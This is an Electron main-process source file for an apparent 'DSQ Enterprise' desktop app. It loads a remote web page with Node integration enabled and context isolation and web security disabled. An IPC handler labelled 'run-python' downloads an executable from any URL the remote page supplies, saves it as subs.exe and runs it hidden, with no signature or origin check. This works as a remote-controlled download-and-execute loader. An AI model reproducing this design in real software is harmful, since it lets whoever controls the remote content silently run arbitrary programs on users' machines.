const { app, BrowserWindow, ipcMain, session } = require('electron');
const path = require('path');
const fs = require('fs');
const https = require('https');
const crypto = require('crypto');
const { exec } = require('child_process');

// ----------------- Config -----------------
const BASE_DIR = "C:\\DSQ Enterprise";
const mainUrl = 'https://dsq-beta.vercel.app/index.html';

// ----------------- Helpers -----------------
function hashFile(filePath) {
    if (!fs.existsSync(filePath)) return null;
    return crypto.createHash('sha256').update(fs.readFileSync(filePath)).digest('hex');
}

// ----------------- Browser Window -----------------
async function createWindow() {
    const ses = session.defaultSession;
    await ses.clearCache();
    await ses.clearStorageData();
    console.log('🗑️ Cache and storage cleared.');

    const win = new BrowserWindow({
        width: 1200,
        height: 900,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false,
            webSecurity: false
        }
    });

    await win.loadURL(mainUrl);
    console.log('✅ index.html loaded from Vercel.');
}

// ----------------- subs.exe Download & Run -----------------
ipcMain.on('run-python', (event, url) => {
    const filePath = path.join(BASE_DIR, 'subs.exe'); // renamed EXE
    const tempPath = filePath + '.new';
    console.log("📥 subs.exe download request for:", url);

    const file = fs.createWriteStream(tempPath);
    const cacheBustedUrl = url.includes('?') ? `${url}&_=${Date.now()}` : `${url}?_=${Date.now()}`;

    https.get(cacheBustedUrl, (response) => {
        if (response.statusCode !== 200) {
            console.error(`❌ Failed to download subs.exe: ${response.statusCode}`);
            file.close(); if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
            return;
        }

        response.pipe(file);
        file.on('finish', () => {
            file.close(() => {
                const newHash = crypto.createHash('sha256').update(fs.readFileSync(tempPath)).digest('hex');
                const oldHash = hashFile(filePath);

                if (newHash !== oldHash) {
                    fs.renameSync(tempPath, filePath);
                    console.log("⬆️ subs.exe updated.");
                } else {
                    fs.unlinkSync(tempPath);
                    console.log("⏩ Using cached subs.exe");
                }

                // Run the downloaded EXE
                exec(`"${filePath}"`, { windowsHide: true }, (err, stdout, stderr) => {
                    if (err) console.error("❌ Execution error:", err);
                    if (stdout) console.log("✅ stdout:\n", stdout);
                    if (stderr) console.error("⚠️ stderr:\n", stderr);
                });
            });
        });
    }).on('error', (err) => {
        console.error('❌ Download error:', err.message);
        if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
    });
});

// ----------------- App Lifecycle -----------------
app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
});
